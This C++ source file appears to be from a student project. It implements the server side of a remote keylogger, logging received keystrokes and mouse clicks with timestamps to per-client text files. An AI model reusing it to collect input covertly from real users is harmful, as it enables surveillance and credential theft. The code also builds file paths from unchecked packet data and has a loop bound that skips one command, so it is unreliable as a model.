//
// command.cpp for  in /home/beche/rendu/test
//
// Made by beche
// Login   <francois.beche@epitech.eu>
//
// Started on  Tue Oct  3 13:15:33 2017 beche
// Last update Sat Oct  7 15:58:58 2017 beche
//

#include <fstream>
#include <iostream>
#include "CommandInput.h"
#include "Data.h"

CommandInput::CommandInput()
{
  this->array[0] = &CommandInput::test;
  this->array[1] = &CommandInput::getKb;
  this->array[2] = &CommandInput::getMouse;
  this->array[3] = &CommandInput::ping;

  this->keys[0] = 0x00;
  this->keys[1] = 0x04;
  this->keys[2] = 0x05;
  this->keys[3] = 0x03;
}

CommandInput::~CommandInput()
{
}

int CommandInput::findCmd(char key)
{
  int i;

  i = 0;
  for (i = 0; i < 3; i++)
  {
    if (this->keys[i] == key)
    {
      return (i);
    }
  }
  return (i);
}

bool CommandInput::execCmd(const int i, t_packet *p)
{
  ((*this).*array[i])(p);
  return (true);
}

bool CommandInput::test(t_packet *p)
{
  (void)p;
  std::cout << "TEST" << std::endl;
  return (true);
}

bool CommandInput::getKb(t_packet *p)
{
  (void)p;
  try
  {
    std::ofstream myfile;
    std::string s;
    s.append(p->name).append(".txt");
    myfile.open(s, std::ios::app);
    std::cout << "\n" << p->name << " Wrinting : " << p->timestamp << ": push: "<< p->k<< std::endl;
    if (myfile.is_open())
    {
        myfile << p->timestamp << ": push: " << p->k << std::endl;  
    }
    else
      std::cerr << "Can't open file .txt" << std::endl;
    myfile.close();
  }
  catch (std::ofstream::failure e)
  {
    std::cerr << "Exception opening/writing/closing file\n";
  }
  return (true);
}

bool CommandInput::getMouse(t_packet *p)
{
  (void)p;
  try
  {
    std::ofstream myfile;
    std::string s;
    s.append(p->name).append(".txt");    
    myfile.open(s, std::ios::app);
    std::cout << "\n" << p->name << " Wrinting : " << p->timestamp << " keycode:" << p->key_code<<":   click at: [" << p->x << "," << p->y << "]" << std::endl;    
    if (myfile.is_open())
    {
        myfile << p->timestamp << " keycode:" << p->key_code<<":   click at: [" << p->x << "," << p->y << "]" <<std::endl;
 }
    else
      std::cerr << "Can't open file.txt" << std::endl;
    myfile.close();
  }
  catch (std::ofstream::failure e)
  {
    std::cerr << "Exception opening/writing/closing file\n";
  }
  return (true);
}

bool CommandInput::ping(t_packet *p)
{
  std::cout << "PING" << std::endl;
  (void)p;
  return (true);
}
